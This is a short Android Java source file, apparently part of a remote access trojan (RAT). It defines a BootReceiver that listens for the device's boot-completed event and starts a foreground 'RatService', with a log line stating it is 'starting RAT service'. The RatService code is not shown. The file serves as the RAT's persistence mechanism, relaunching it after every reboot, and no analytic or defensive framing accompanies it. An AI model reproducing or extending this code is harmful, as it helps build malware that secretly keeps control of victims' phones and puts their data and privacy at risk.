package com.my.luck.core;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

public class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
            Log.d("BootReceiver", "Device rebooted, starting RAT service");
            Intent serviceIntent = new Intent(context, RatService.class);
            context.startForegroundService(serviceIntent);
        }
    }
}